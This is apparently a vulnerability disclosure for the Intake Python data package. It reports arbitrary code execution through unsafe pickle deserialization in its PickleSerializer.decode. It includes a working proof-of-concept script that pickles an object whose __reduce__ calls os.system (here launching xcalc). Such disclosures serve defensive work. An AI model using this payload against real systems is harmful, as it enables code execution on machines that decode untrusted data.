# Description
Intake is a lightweight package for finding, investigating, loading and disseminating data. 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip install intake')
from intake.container import serializer
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
serializer.PickleSerializer.decode(dumps,dumps,dumps)
```
* `pip3 install intake`
* `python3 exploit.py`
